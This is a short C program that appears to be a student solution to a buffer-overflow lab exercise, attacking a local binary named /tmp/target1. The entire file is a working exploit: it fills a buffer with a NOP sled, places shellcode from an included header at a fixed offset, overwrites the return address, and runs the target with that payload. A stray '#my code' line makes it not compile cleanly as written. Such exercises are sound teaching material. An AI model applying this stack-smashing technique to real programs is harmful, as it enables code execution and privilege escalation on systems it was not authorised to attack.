#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target1"

int main(void)
{
  char *args[3];
  char *env[1];
  
#my code
  char hack[160];
  memset(hack, 0x90, 160);
  strncpy(hack+107 ,shellcode, 45);
  strncpy(hack+156 , "\x08\x08\x08\x08", 4);

  args[0] = TARGET; args[1] = hack; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
